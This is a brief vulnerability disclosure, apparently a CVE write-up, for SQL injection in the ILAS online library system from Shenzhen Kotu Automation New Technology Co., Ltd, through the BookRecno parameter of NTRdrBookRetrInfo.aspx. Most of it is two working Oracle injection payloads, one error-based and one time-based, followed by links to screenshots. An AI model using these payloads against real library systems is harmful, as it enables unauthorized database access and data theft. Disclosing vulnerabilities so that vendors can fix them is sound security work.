

## SQL injection into ilas online library

- Shenzhen Kotu Automation New Technology Co., Ltd

- NTRdrBookRetrInfo.aspx

- Parameter: BookRecno

### POC

```
/NTRdrBookRetrInfo.aspx?BookRecno=57539' AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))-- wXyW

//or

/NTRdrBookRetrInfo.aspx?BookRecno=57539'||DBMS_PIPE.RECEIVE_MESSAGE('IsjT',6)||'
```

![](https://github.com/shigophilo/CVE/blob/main/imgs/20240816152134.png)

![](https://github.com/shigophilo/CVE/blob/main/imgs/image-20240816141218583.png?raw=true)